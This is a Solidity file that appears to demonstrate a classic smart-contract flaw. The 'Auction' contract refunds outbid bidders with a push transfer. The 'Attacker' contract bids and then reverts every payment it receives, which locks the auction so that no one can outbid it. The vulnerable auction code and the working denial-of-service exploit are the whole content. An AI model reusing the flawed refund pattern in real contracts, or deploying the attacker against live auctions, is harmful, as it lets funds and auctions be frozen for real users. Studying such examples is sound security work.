// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Auction {
    address public curWinner;
    uint256 public curBid;
    
    function bid() payable external {
        uint256 value = msg.value;
        require(value > curBid);
        if (curWinner != address(0)) {
            payable(curWinner).transfer(curBid);
        }
        curWinner = msg.sender;
        curBid = value;
    } 
}

contract Attacker{
    Auction auction;

    constructor(address a){
        auction = Auction(a);
    }

    function placeBid() payable external {
        auction.bid{value: msg.value}();
    }

    receive() external payable  {
        revert("Hacked");
    }
}